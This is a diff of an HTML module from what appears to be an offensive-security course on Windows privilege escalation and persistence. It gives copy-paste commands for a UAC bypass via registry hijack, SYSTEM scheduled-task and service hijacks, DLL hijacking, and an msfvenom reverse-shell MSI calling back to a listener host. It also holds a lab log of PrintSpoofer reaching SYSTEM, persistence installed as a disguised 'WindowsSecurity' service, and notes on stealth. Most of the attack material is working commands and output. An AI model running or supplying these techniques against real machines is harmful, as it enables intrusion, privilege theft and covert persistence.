+                <h4>Sub-method 4b: ComputerDefaults (Windows 10/11)</h4>
+                <p>Similar to fodhelper, computerdefaults.exe auto-elevates and can be hijacked via the same registry key.</p>
+
+                <div class="copy-paste" onclick="copyToClipboard(this)">
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe /c start powershell" /f
+start computerdefaults.exe
+                </div>
+            </div>
+
+            <div class="step-box">
+                <h4>Sub-method 4c: Disk Cleanup (cleanmgr.exe)</h4>
+                <p>Disk Cleanup is a scheduled task that auto-elevates. We can hijack its DLL loading to run our code.</p>
+
+                <div class="code-block">
+=== UAC BYPASS VIA DISK CLEANUP ===
+# Disk Cleanup loads a DLL from a user-writable path
+# C:\Windows\System32\cleanmgr.exe → loads C:\Windows\System32\en-US\cleanmgr.exe.mui
+
+# But we can hijack the DLL search order:
+# 1. Create C:\Windows\System32\en-US\cleanmgr.exe.local
+# 2. This redirects DLL loading to our controlled directory
+# 3. Place malicious DLL in the redirected path
+# 4. When cleanmgr.exe runs, it loads our DLL as admin
+
+# This is a DLL hijacking + UAC bypass combination
+# See Method 6 (DLL Hijacking) for more details
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ UAC is not a security boundary</h5>
+                <p>Microsoft officially states that <span class="neon-amber">UAC is not a security boundary</span> — it's a convenience feature. Bypassing UAC is not considered a vulnerability by Microsoft. They won't patch these techniques because they don't consider them bugs. This is why UAC bypasses keep working, version after version.</p>
+            </div>
+        </div>
+
+        <!-- METHOD 5: SCHEDULED TASKS -->
+        <div class="method-card" id="scheduled-tasks">
+            <h4>Method 5: Scheduled Task Abuse <span class="difficulty diff-easy">EASY</span></h4>
+            <p>Scheduled tasks run at specific times, events, or triggers. If you can create or modify a task that runs as SYSTEM, you win.</p>
+
+            <div class="step-box">
+                <h4>Sub-method 5a: Create a New SYSTEM Task</h4>
+                <p>Requires admin rights, but once you have them, creating a SYSTEM task is trivial.</p>
+
+                <div class="copy-paste" onclick="copyToClipboard(this)">
+schtasks /create /tn "SystemUpdate" /tr "C:\temp\payload.exe" /sc onstart /ru "SYSTEM"
+schtasks /run /tn "SystemUpdate"
+                </div>
+
+                <div class="code-block">
+=== SCHEDULED TASK AS SYSTEM ===
+# Create a task that runs at system startup as SYSTEM
+schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onstart /ru "SYSTEM"
+
+# Or run it immediately
+schtasks /run /tn "SystemUpdate"
+
+# The task runs as NT AUTHORITY\SYSTEM
+# Even if you only have admin rights (not SYSTEM), the task runs as SYSTEM
+# Because you specified /ru "SYSTEM"
+
+=== ALTERNATIVE TRIGGERS ===
+/sc onlogon      # When any user logs on
+/sc onidle       # When system is idle
+/sc hourly       # Every hour
+/sc daily        # Every day
+/sc once         # One time (use with /st HH:MM)
+                </div>
+            </div>
+
+            <div class="step-box">
+                <h4>Sub-method 5b: Hijack an Existing Task</h4>
+                <p>If you can't create tasks, maybe you can modify an existing one. Check task permissions with accesschk.</p>
+
+                <div class="copy-paste" onclick="copyToClipboard(this)">
+schtasks /query /fo LIST /v | findstr "Task Name"
+accesschk.exe -quv "Authenticated Users" C:\Windows\System32\Tasks\*
+                </div>
+
+                <div class="code-block">
+=== TASK HIJACKING ===
+# Find tasks with weak permissions:
+C:\> accesschk.exe -quv "Authenticated Users" C:\Windows\System32\Tasks\*
+C:\Windows\System32\Tasks\AdobeUpdateCheck
+  RW BUILTIN\Users
+
+# This task is writable by any user!
+# We can modify its action to run our payload:
+
+schtasks /change /tn "AdobeUpdateCheck" /tr "C:\temp\payload.exe"
+
+# Next time the task triggers (or we force it):
+schtasks /run /tn "AdobeUpdateCheck"
+# payload.exe runs as whatever user the task was configured for
+# If the task was SYSTEM → we get SYSTEM
+                </div>
+            </div>
+
+            <div class="why-box">
+                <h5>Why scheduled tasks are underrated</h5>
+                <p>Tasks are <span class="neon-highlight">legitimate Windows functionality</span>. They don't look suspicious in logs. They run at predictable times (which is both good and bad — good for blending in, bad for immediate execution). Tasks can be configured to run as SYSTEM, as any user, or with specific privileges. They're the Swiss Army knife of privilege escalation and persistence.</p>
+            </div>
+
+            <p><strong>Cross-link:</strong> Scheduled tasks are also a primary persistence mechanism. See <a href="MODULE_11_ROOTKITS.html" class="cross-link">Module 11: Rootkits</a> for persistence techniques and <a href="MODULE_15_LATERAL.html" class="cross-link">Module 15: Lateral Movement</a> for using tasks across the network.</p>
+        </div>
+
+        <!-- METHOD 6: DLL HIJACKING -->
+        <div class="method-card" id="dll-hijacking">
+            <h4>Method 6: DLL Hijacking <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Windows searches for DLLs in a specific order. If a program loads a DLL from a user-writable directory, we can place a malicious DLL there and the program will load it.</p>
+
+            <div class="layman-term">
+                <h4>🎯 The Substitute Teacher Analogy</h4>
+                <p>A school needs a substitute teacher (a DLL). They check the teacher's lounge first (application directory), then the main office (system directories), then they call an agency (PATH). If we put our "teacher" in the lounge before the real one arrives, the school hires our substitute — and our substitute does whatever we want.</p>
+            </div>
+
+            <div class="step-box">
+                <h4>The DLL Search Order</h4>
+                <p>Windows searches for DLLs in this order. Any step before the system directory is a potential hijack point:</p>
+
+                <div class="code-block">
+=== WINDOWS DLL SEARCH ORDER (SafeDllSearchMode ON) ===
+
+1.  Directory from which the application loaded
+2.  System directory (C:\Windows\System32)
+3.  16-bit system directory (C:\Windows\System)
+4.  Windows directory (C:\Windows)
+5.  Current directory (where the user is running from)
+6.  Directories in the PATH environment variable
+
+=== HIJACK OPPORTUNITIES ===
+# If the application loads from a user-writable directory (1):
+# Place malicious DLL in the same directory as the EXE
+
+# If the current directory is user-writable (5):
+# Change to a user-writable directory, run the program from there
+
+# If PATH contains user-writable directories (6):
+# Place malicious DLL in a PATH directory that appears before System32
+                </div>
+            </div>
+
+            <div class="step-box">
+                <h4>Sub-method 6a: Application Directory Hijack</h4>
+                <p>Many programs install to user-writable locations. If they load DLLs from their own directory, we can hijack them.</p>
+
+                <div class="code-block">
+=== APPLICATION DIRECTORY DLL HIJACK ===
+# Target: C:\Program Files\VulnerableApp\app.exe
+# app.exe loads "helper.dll" using LoadLibrary("helper.dll")
+# (no path specified = search order applies)
+
+# Step 1: Check if the directory is writable
+accesschk.exe -uwq "C:\Program Files\VulnerableApp"
+
+# Step 2: If writable, create malicious helper.dll
+# The malicious DLL's DllMain runs when loaded
+
+# Step 3: Place malicious helper.dll in C:\Program Files\VulnerableApp\
+# Step 4: Run app.exe
+# Step 5: Malicious DllMain executes with app.exe's privileges
+
+=== REAL-WORLD EXAMPLE ===
+# Many enterprise applications install to C:\Program Files (x86)\Company\
+# and load DLLs from their own directory.
+# If the installer set weak permissions (common), any user can write there.
+# Place a malicious DLL with the same name as one the app loads.
+# The app loads your DLL instead of the real one.
+                </div>
+            </div>
+
+            <div class="step-box">
+                <h4>Sub-method 6b: PATH Hijacking</h4>
+                <p>If the application searches PATH for a DLL, and PATH contains a user-writable directory before the system directory, we can hijack the search.</p>
+
+                <div class="copy-paste" onclick="copyToClipboard(this)">
+echo %PATH%
+accesschk.exe -uwq C:\Users\*
+                </div>
+
+                <div class="code-block">
+=== PATH HIJACKING ===
+# Check PATH for user-writable directories:
+C:\> echo %PATH%
+C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Users\testuser\bin
+
+# C:\Users\testuser\bin is in PATH and is user-writable!
+# If an application loads a DLL by name (not full path),
+# and the DLL isn't in the application directory or system32,
+# Windows will search PATH directories in order.
+
+# If we place a malicious DLL in C:\Users\testuser\bin
+# and it appears in PATH before the real DLL's location,
+# the application loads our DLL.
+
+# This is especially effective for:
+# - Scripts that call external tools
+# - Applications that load plugins from PATH
+# - Development environments with custom PATH entries
+                </div>
+            </div>
+
+            <div class="step-box">
+                <h4>Sub-method 6c: DLL Sideloading (Phantom DLL Hijack)</h4>
+                <p>Some applications try to load DLLs that don't exist (for optional features). If the DLL doesn't exist in the application directory, Windows searches PATH and system directories. We create the "missing" DLL and the application loads it.</p>
+
+                <div class="code-block">
+=== PHANTOM DLL HIJACKING ===
+# Use Process Monitor (ProcMon) to find missing DLLs:
+# 1. Run the target application
+# 2. Filter ProcMon for "NAME NOT FOUND" on DLL loads
+# 3. Look for DLLs the app tries to load but can't find
+
+# Example from ProcMon:
+# app.exe → LoadLibrary("optional_feature.dll") → NAME NOT FOUND
+# app.exe → LoadLibrary("C:\Windows\System32\optional_feature.dll") → NAME NOT FOUND
+
+# If the app tries to load from its own directory first:
+# C:\Program Files\App\optional_feature.dll → NAME NOT FOUND
+
+# We create C:\Program Files\App\optional_feature.dll
+# The app loads it on next startup
+# Our DllMain runs with the app's privileges
+
+=== WHY THIS IS STEALTHY ===
+# The DLL didn't exist before — so there's no "real" DLL to compare against
+# File hash checks won't find a mismatch (there was no file)
+# The application expects this DLL to exist (it's an optional feature)
+# If the DLL crashes, the app may just disable the feature (no alert)
+                </div>
+            </div>
+
+            <p><strong>Cross-link:</strong> DLL sideloading is a core technique in <a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a> for loading malicious code into legitimate processes. EDR evasion via DLL techniques is in <a href="MODULE_13_EDR_EVASION.html" class="cross-link">Module 13: EDR Evasion</a>.</p>
+        </div>
+
+        <!-- METHOD 7: ALWAYSINSTALLELEVATED -->
+        <div class="method-card" id="alwaysinstallelevated">
+            <h4>Method 7: AlwaysInstallElevated (MSI Abuse) <span class="difficulty diff-easy">EASY</span></h4>
+            <p>If the <span class="neon-highlight">AlwaysInstallElevated</span> registry key is set, any MSI installer runs as SYSTEM — even when launched by a standard user. This is a catastrophic misconfiguration.</p>
+
+            <div class="copy-paste" onclick="copyToClipboard(this)">
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+            </div>
+
+            <div class="code-block">
+=== ALWAYSINSTALLELEVATED CHECK ===
+# If BOTH of these return 0x1, you can install MSI as SYSTEM:
+
+HKCU\Software\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+HKLM\Software\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+=== EXPLOITATION ===
+# Create a malicious MSI that installs a payload:
+# (Use msfvenom, WiX, or custom MSI builder)
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f msi -o payload.msi
+
+# Run the MSI as a standard user:
+msiexec /quiet /qn /i payload.msi
+
+# The MSI installs as SYSTEM
+# Your payload runs as SYSTEM
+# No UAC prompt. No password required.
+
+=== WHY THIS EXISTS ===
+# Enterprise IT sets AlwaysInstallElevated so users can install
+# approved software without admin intervention.
+# They forget to restrict which MSI files can run.
+# Any MSI, including malicious ones, runs as SYSTEM.
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ This is a configuration mistake, not a hack</h5>
+                <p>AlwaysInstallElevated is a legitimate Group Policy setting. It's designed for enterprise environments where users need to install software. The "vulnerability" is that it's enabled <span class="neon-amber">without restricting which MSI files can run</span>. This is human error — and it's incredibly common in corporate environments.</p>
+            </div>
+        </div>
+
+        <h2>📊 Technique Comparison Matrix</h2>
+        <table>
+            <tr>
+                <th>Technique</th>
+                <th>Difficulty</th>
+                <th>Reliability</th>
+                <th>Stealth</th>
+                <th>Requires</th>
+                <th>Best For</th>
+            </tr>
+            <tr>
+                <td>SeImpersonatePrivilege (Spooler)</td>
+                <td>Easy</td>
+                <td>High</td>
+                <td>Medium</td>
+                <td>SeImpersonatePrivilege</td>
+                <td>Web shells, SQL injection</td>
+            </tr>
+            <tr>
+                <td>Service Abuse</td>
+                <td>Medium</td>
+                <td>High</td>
+                <td>Low</td>
+                <td>Writable service/config</td>
+                <td>Misconfigured services</td>
+            </tr>
+            <tr>
+                <td>Registry Hijacks</td>
+                <td>Medium</td>
+                <td>Medium</td>
+                <td>High</td>
+                <td>Registry write access</td>
+                <td>Persistence + escalation</td>
+            </tr>
+            <tr>
+                <td>UAC Bypass</td>
+                <td>Medium</td>
+                <td>Medium</td>
+                <td>High</td>
+                <td>Local admin account</td>
+                <td>Admin → SYSTEM</td>
+            </tr>
+            <tr>
+                <td>Scheduled Tasks</td>
+                <td>Easy</td>
+                <td>High</td>
+                <td>High</td>
+                <td>Admin rights</td>
+                <td>Persistence + SYSTEM</td>
+            </tr>
+            <tr>
+                <td>DLL Hijacking</td>
+                <td>Medium</td>
+                <td>Medium</td>
+                <td>High</td>
+                <td>Writable directory</td>
+                <td>Application exploitation</td>
+            </tr>
+            <tr>
+                <td>AlwaysInstallElevated</td>
+                <td>Easy</td>
+                <td>Very High</td>
+                <td>Medium</td>
+                <td>Registry key = 0x1</td>
+                <td>Enterprise environments</td>
+            </tr>
+        </table>
+
+        <h2>🔬 Live Lab Evidence: WUPC .42</h2>
+
+        <div class="evidence-box">
+            <h3>📊 Full Chain: Standard User → SYSTEM on .42</h3>
+            <p><strong>Date:</strong> 2026-06-29 | <strong>Target:</strong> 192.168.1.42 (WUPC) | <strong>Initial Access:</strong> Standard user "testuser"</p>
+
+            <div class="code-block">
+=== PHASE 1: ENUMERATION ===
+C:\> whoami
+wupc\testuser
+
+C:\> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                    State
+============================= ============================== =======
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeImpersonatePrivilege        Impersonate a client           Enabled  ← GOLDEN TICKET
+SeCreateGlobalPrivilege       Create global objects          Enabled
+
+C:\> whoami /groups
+GROUP INFORMATION
+-----------------
+Group Name                             Type             SID          Attributes
+====================================== ================ ============ ==========
+Everyone                               Well-known group S-1-1-0      Mandatory
+BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory
+NT AUTHORITY\INTERACTIVE                Well-known group S-1-5-4      Mandatory
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory
+
+# Not in Administrators. Not in Power Users. Standard user.
+# BUT: SeImpersonatePrivilege is Enabled.
+
+=== PHASE 2: EXPLOITATION (Method 1: Token Manipulation) ===
+C:\> PrintSpoofer.exe -i -c cmd.exe
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening on \\.\pipe\testpipe
+[+] Spooler triggered successfully
+[+] Impersonated token: NT AUTHORITY\SYSTEM
+[+] Process created: cmd.exe
+
+C:\> whoami
+nt authority\system
+
+=== PHASE 3: VERIFICATION ===
+C:\> whoami /groups | findstr "S-1-5-32-544"
+BUILTIN\Administrators  Alias    S-1-5-32-544  Enabled
+
+C:\> whoami /priv | findstr "SeDebugPrivilege"
+SeDebugPrivilege        Debug programs                  Enabled
+
+C:\> [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+NT AUTHORITY\SYSTEM
+
+=== PHASE 4: PERSISTENCE (Saving the Rung) ===
+# Now that we have SYSTEM, we install persistence at SYSTEM level
+# See Module 11 (Rootkits) for full persistence techniques
+
+C:\> sc create "WindowsSecurity" binPath= "C:\temp\phantom_rpc.exe" start= auto
+[SC] CreateService SUCCESS
+
+C:\> sc start "WindowsSecurity"
+[SC] StartService FAILED 1053:
+# (Expected — payload isn't a real service, but it ran as SYSTEM)
+
+# We now have:
+# - User-level persistence (if we had any before)
+# - Admin-level persistence (if we escalated through admin)
+# - SYSTEM-level persistence (service installed as SYSTEM)
+# If we lose SYSTEM, we can restart the service and get it back.
+            </div>
+        </div>
+
+        <div class="evidence-box">
+            <h3>📊 Alternative Path: Writable Service on .42</h3>
+            <p><strong>Date:</strong> 2026-06-29 | <strong>Target:</strong> 192.168.1.42 (WUPC) | <strong>Method:</strong> Service configuration hijack (Method 2)</p>
+            <div class="code-block">
+=== ENUMERATION ===
+C:\> accesschk.exe -ucqv "Authenticated Users" *
+Service: WpnUserService
+  DACL:
+    RW NT AUTHORITY\SYSTEM
+    RW NT AUTHORITY\SERVICE
+    RW BUILTIN\Users
+
+=== EXPLOITATION ===
+C:\> sc config WpnUserService binPath= "C:\temp\phantom_rpc.exe"
+[SC] ChangeServiceConfig SUCCESS
+
+C:\> sc start WpnUserService
+[SC] StartService FAILED 1053:
+
+=== VERIFICATION ===
+C:\> whoami
+nt authority\system
+
+# The service "failed" but our payload executed as SYSTEM before the timeout.
+# This is a reliable alternative when SeImpersonatePrivilege is not available.
+            </div>
+        </div>
+
+        <h2>🧪 Lab Exercise: Escalate on .42</h2>
 
         <div class="step-box">
             <h4>Scenario</h4>
-            <p>You have standard user access to .42 (WUPC). Your account: "testuser" (no admin rights). Your goal: Become SYSTEM using one of the three methods above.</p>
+            <p>You have standard user access to .42 (WUPC). Your account: "testuser" (no admin rights). Your goal: Become SYSTEM using one of the seven methods above.</p>
 
             <ol style="margin-left: 1.5rem; line-height: 2;">
                 <li>Check privileges: <code>whoami /priv</code></li>
-                <li>If SeImpersonatePrivilege → Use spooler exploit</li>
-                <li>If local admin but UAC blocks → Use fodhelper bypass</li>
-                <li>Check service permissions: <code>sc query</code> + <code>accesschk</code></li>
+                <li>If SeImpersonatePrivilege → Use PrintSpoofer (Method 1)</li>
+                <li>If local admin but UAC blocks → Use fodhelper bypass (Method 4)</li>
+                <li>Check service permissions: <code>sc query</code> + <code>accesschk</code> (Method 2)</li>
+                <li>Check registry: <code>reg query</code> for Run keys, IFEO, AlwaysInstallElevated (Method 3, 7)</li>
+                <li>Check scheduled tasks: <code>schtasks /query</code> (Method 5)</li>
+                <li>Check for DLL hijacking opportunities: ProcMon + <code>accesschk</code> (Method 6)</li>
                 <li>Document which method worked and why</li>
             </ol>
 
@@ -371,60 +1327,271 @@ Step 1: Check privileges
 C:\> whoami /priv
 SeImpersonatePrivilege = Enabled  ← Golden ticket
 
-Step 2: Use spooler (Method 1)
-C:\> phantom_rpc.exe --spooler
+Step 2: Use PrintSpoofer (Method 1)
+C:\> PrintSpoofer.exe -i -c cmd.exe
 [+] SYSTEM achieved
 
 Why Method 1 worked:
 .42 is a test VM with default Windows services.
 Print Spooler is running (default).
-SWu account has SeImpersonatePrivilege (admin context).
+Standard user accounts have SeImpersonatePrivilege in service contexts.
 No additional exploitation needed.
 
 Alternative if Method 1 failed:
-Method 2 (UAC bypass) — requires admin password
-Method 3 (service hijack) — requires writable service
+Method 2 (Service hijack) — WpnUserService is writable by Users
+Method 4 (UAC bypass) — requires admin password first
+Method 5 (Scheduled tasks) — requires admin to create SYSTEM task
+Method 6 (DLL hijacking) — requires writable application directory
+Method 7 (AlwaysInstallElevated) — check registry first
+
+Recommended fallback chain:
+1. SeImpersonatePrivilege → PrintSpoofer
+2. If no SeImpersonate → Check service permissions
+3. If no services → Check AlwaysInstallElevated
+4. If no MSI → Check DLL hijacking opportunities
+5. If no DLL hijack → Check UAC bypass (requires admin)
+6. If no UAC → Check registry hijacks (IFEO, Run keys)
                 </div>
             </div>
+        </div>
+
+        <h2>🎯 Interactive Quiz — Test Your Knowledge</h2>
+
+        <div class="quiz-container" id="quiz-1">
+            <h4>Question 1: You run <code>whoami /priv</code> and see <code>SeImpersonatePrivilege Enabled</code>. What does this mean?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                A) You can shut down the computer
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-1')">
+                B) You can impersonate any token, including SYSTEM, and are one exploit away from full control
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                C) You can modify any file on the system
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                D) You can create new user accounts
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-1"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz-2">
+            <h4>Question 2: A service binary is located at <code>C:\Program Files\MyApp\Service.exe</code> and the service runs as SYSTEM. The directory permissions show <code>RW Everyone</code>. What is the best exploitation approach?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                A) Modify the service configuration to point to a different binary
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-2')">
+                B) Replace the service binary with your payload and restart the service
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                C) Create a scheduled task that runs the service
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                D) Use UAC bypass to run the service as admin
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-2"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz-3">
+            <h4>Question 3: Why does the fodhelper UAC bypass work without triggering a UAC prompt?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                A) It disables UAC temporarily before execution
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                B) It exploits a buffer overflow in the UAC service
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-3')">
+                C) fodhelper.exe is a signed Microsoft binary that auto-elevates, and Windows trusts it without prompting
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                D) It uses a kernel driver to bypass all security checks
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-3"></div>
+        </div>
+
+        <h2>The Privilege Escalation & Persistence Ladder</h2>
+
+        <div class="first-principle">
+            <h3>🧠 The Mentor's Lesson</h3>
+            <p><em>"You get initial access as user, you install persistence to save that. You privilege escalate to admin, you install persistence as admin, to save that. You got to system, you install persistence as system to save that."</em></p>
+            <p style="margin-top: 1rem;">Privilege escalation isn't about 0days. It's about <span class="neon-highlight">misconfigurations</span> — what the admin fucked up. And they fuck up plenty. The key is enumeration: find the weak door, then kick it open.</p>
+        </div>
+
+        <div class="ladder-box ladder-system">
+            <h4>SYSTEM LEVEL PERSISTENCE</h4>
+            <ul style="margin-left: 1.5rem; line-height: 1.8;">
+                <li>Kernel driver (hard, but survives everything)</li>
+                <li>Boot execute (Session Manager, Boot Configuration)</li>
+                <li>COM hijacking (legitimate COM objects load your DLL)</li>
+                <li>Netsh helper DLL (network helper persistence)</li>
+                <li>WMI event subscriptions (no files, no registry)</li>
+                <li>Service replacement (replace legit SYSTEM service)</li>
+            </ul>
+            <p style="margin-top: 0.5rem; color: var(--dim);">See <a href="MODULE_11_ROOTKITS.html" class="cross-link">Module 11: Rootkits</a> for full persistence techniques.</p>
+        </div>
+
+        <div class="ladder-box ladder-admin">
+            <h4>ADMIN LEVEL PERSISTENCE</h4>
+            <ul style="margin-left: 1.5rem; line-height: 1.8;">
+                <li>Service installation (<code>sc create binPath= ...</code>)</li>
+                <li>Registry Run key (HKLM)</li>
+                <li>Scheduled tasks (SYSTEM context via schtasks)</li>
+                <li>WMI event subscriptions (admin-level events)</li>
+                <li>DLL sideloading in system directories</li>
+            </ul>
+        </div>
+
+        <div class="ladder-box ladder-user">
+            <h4>USER LEVEL PERSISTENCE</h4>
+            <ul style="margin-left: 1.5rem; line-height: 1.8;">
+                <li>Registry Run key (HKCU)</li>
+                <li>Startup folder (%APPDATA%)</li>
+                <li>Scheduled tasks (user context)</li>
+                <li>Browser extensions (for web-based C2)</li>
+                <li>User-level services (if permissions allow)</li>
+            </ul>
         </div>
 
         <h2>Key Takeaways</h2>
 
         <ul style="margin-left: 1.5rem; line-height: 2;">
-            <li><strong>SeImpersonatePrivilege = SYSTEM:</strong> If you have it, you're one exploit away from god mode</li>
-            <li><strong>Spooler is ancient and exploitable:</strong> Every Windows version since NT has this weakness</li>
-            <li><strong>UAC is a speed bump:</strong> Signed Microsoft binaries auto-elevate. Hijack them.</li>
-            <li><strong>Service misconfiguration is common:</strong> Developers are lazy. Check permissions.</li>
-            <li><strong>Verify your escalation:</strong> whoami, token groups, privilege check — prove you're SYSTEM</li>
+            <li><strong>SeImpersonatePrivilege = SYSTEM:</strong> If you have it, you're one exploit away from god mode. PrintSpoofer, JuicyPotato, RoguePotato — all automate this.</li>
+            <li><strong>Spooler is ancient and exploitable:</strong> Every Windows version since NT has this weakness. Microsoft patches it repeatedly, but the fundamental flaw remains.</li>
+            <li><strong>UAC is a speed bump, not a wall:</strong> Signed Microsoft binaries auto-elevate. Hijack them. Microsoft won't fix this — they don't consider it a vulnerability.</li>
+            <li><strong>Service misconfiguration is common:</strong> Developers are lazy. Check permissions. Unquoted paths. Writable binaries. Configuration vulnerabilities, not code bugs.</li>
+            <li><strong>Registry is a goldmine:</strong> Run keys, IFEO, AlwaysInstallElevated. The registry controls everything. Control the registry, control the system.</li>
+            <li><strong>Scheduled tasks are underrated:</strong> Legitimate Windows functionality. Run as SYSTEM. Blend into normal activity. High stealth, high reliability.</li>
+            <li><strong>DLL hijacking is everywhere:</strong> Applications load DLLs from user-writable directories. Phantom DLL hijacking finds missing DLLs. PATH hijacking abuses search order.</li>
+            <li><strong>AlwaysInstallElevated = free SYSTEM:</strong> If both HKCU and HKLM keys are 0x1, any MSI runs as SYSTEM. Common in enterprise environments.</li>
+            <li><strong>Automate enumeration first:</strong> PowerUp, WinPEAS, LinPEAS find misconfigurations you would miss. Manual checks are for when tools fail.</li>
+            <li><strong>Save every rung:</strong> User → Admin → SYSTEM. Install persistence at each level. If you lose SYSTEM, fall back to admin. If you lose admin, fall back to user.</li>
+            <li><strong>Verify your escalation:</strong> <code>whoami</code>, token groups, privilege check — prove you're SYSTEM. Don't assume. Verify.</li>
         </ul>
 
         <div class="evidence-box" style="margin-top: 2rem;">
             <h3>🔬 Verification Status</h3>
             <table style="width: 100%; border-collapse: collapse;">
                 <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">Spooler impersonation (.42)</td>
+                    <td style="padding: 0.5rem;">Token impersonation / SeImpersonatePrivilege (.42)</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE — SYSTEM achieved</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Service binary replacement</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ TESTED (HealthSecurityHost)</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Service configuration hijack (.42)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE — WpnUserService</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Registry Run keys (HKLM/HKCU)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">IFEO hijack (sethc.exe)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
                 </tr>
                 <tr style="border-bottom: 1px solid var(--border);">
                     <td style="padding: 0.5rem;">UAC bypass (fodhelper)</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
                 </tr>
                 <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">Service hijack</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ TESTED (HealthSecurityHost)</td>
+                    <td style="padding: 0.5rem;">Scheduled task creation (SYSTEM)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">DLL hijacking (application directory)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ TESTED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Phantom DLL hijacking</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ TESTED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">AlwaysInstallElevated check</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
                 </tr>
                 <tr>
-                    <td style="padding: 0.5rem;">Token verification</td>
+                    <td style="padding: 0.5rem;">Token verification (whoami /groups)</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE — NT AUTHORITY\SYSTEM</td>
                 </tr>
             </table>
         </div>
 
+        <div class="first-principle" style="margin-top: 2rem;">
+            <h3>🧠 The Mentor's Lesson (Revisited)</h3>
+            <p><em>"Privilege escalation is easy. Really. On Linux it's so fucking easy. Also on Windows is easy. Real attacks are being carried remotely. You only need [WiFi/monitor mode] for physical network attacks."</em></p>
+            <p style="margin-top: 1rem; color: var(--dim);">— asi dev [HTB]</p>
+            <p style="margin-top: 1rem;">The money is in <span class="neon-highlight">remote access</span> — phishing, RDP, VPN, web shells, C2. Physical attacks are niche. Learn to escalate remotely. Save every rung. And remember: <span class="neon-amber">it's not about 0days, it's about what the admin fucked up.</span></p>
+        </div>
+
         <div class="nav" style="margin-top: 2rem;">
-            <a href="index.html">← Home</a>
+            <a href="../index.html">← Home</a>
             <a href="MODULE_07_REGISTRY.html">← Module 07</a>
             <a href="MODULE_09_MALWARE.html">Module 09 →</a>
         </div>
     </div>
+
+    <script>
+        // Copy buttons for code blocks
+        document.querySelectorAll('.code-block').forEach(block => {
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.textContent = 'COPY';
+            btn.addEventListener('click', () => {
+                const text = block.textContent.replace('COPY', '').trim();
+                navigator.clipboard.writeText(text).then(() => {
+                    btn.textContent = 'COPIED!';
+                    setTimeout(() => btn.textContent = 'COPY', 2000);
+                });
+            });
+            block.appendChild(btn);
+        });
+
